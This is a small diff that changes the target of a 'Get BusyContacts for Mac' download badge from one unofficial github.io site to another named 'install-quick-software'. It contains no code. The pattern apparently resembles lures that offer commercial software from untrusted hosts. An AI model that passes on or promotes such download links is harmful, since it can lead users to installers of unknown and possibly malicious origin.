@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get BusyContacts Mac](https://img.shields.io/badge/Get_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/busycontacts)
+[![Get BusyContacts Mac](https://img.shields.io/badge/Get_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://install-quick-software.github.io/.github/busycontacts)
 
 </div>
 
